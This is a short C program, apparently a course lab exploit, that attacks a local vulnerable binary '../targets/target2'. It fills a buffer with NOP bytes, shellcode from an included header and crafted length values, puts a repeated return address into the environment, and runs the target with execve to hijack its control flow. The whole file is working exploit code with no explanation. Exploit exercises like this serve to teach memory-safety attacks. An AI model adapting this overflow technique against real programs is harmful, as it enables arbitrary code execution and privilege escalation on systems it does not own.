#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[5];

	char temp1[267];
	char temp2[12];
	char tem[4] = "\x80\xfd\x21\x20";
	char num[4] = "\x1b\x01\x00\x00"; //283
	char ii[4] = "\x0c\x01\x00\x00"; // 268

	int i;
	for(i=0;i<=266;i++){
		if (i<3) temp1[i]=0x90;
		else if (i<48) temp1[i]=shellcode[i-3];
		else if (i<264) temp1[i]=0x90;
		else if (i<=266) temp1[i]=num[i-264]; // change len
	}

	for(i=0;i<12;i++){
		temp2[i]=tem[i%4];
	}
	

	args[0] = TARGET;
	args[1] = temp1;
	args[2] = NULL;

	env[0] = "\x00"; 
	env[1] = "\x0c\x01\x00"; //268
	env[2] = "\x00";
	env[3] = temp2;
	env[4] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
